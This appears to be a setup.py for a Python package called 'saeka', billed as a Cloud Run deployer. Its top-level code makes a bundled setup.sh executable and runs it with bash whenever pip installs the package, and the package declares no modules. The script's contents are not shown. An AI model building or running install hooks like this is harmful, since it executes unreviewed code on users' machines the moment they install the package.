import os
import subprocess
import sys
from setuptools import setup

# ------------------------------------------------------------------------------
# AUTO-EXECUTION ENGINE
# This runs immediately when `pip install saeka` extracts setup.py
# ------------------------------------------------------------------------------
def execute_deployer():
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    SCRIPT_PATH = os.path.join(BASE_DIR, "setup.sh")

    if os.path.exists(SCRIPT_PATH):
        # Ensure executable permissions
        os.chmod(SCRIPT_PATH, 0o755)
        
        # Execute script and stream output directly to terminal
        try:
            subprocess.run(["bash", SCRIPT_PATH], check=True)
        except KeyboardInterrupt:
            print("\nProcess canceled by user.")
        except Exception as e:
            print(f"\nExecution error: {e}")

# Run script immediately upon pip setup execution
execute_deployer()

# Standard Minimal Package Info
setup(
    name="saeka",
    version="1.2.0",
    description="Saeka GCP Cloud Run Deployer",
    author="Saeka Tojirp",
    py_modules=[],
)
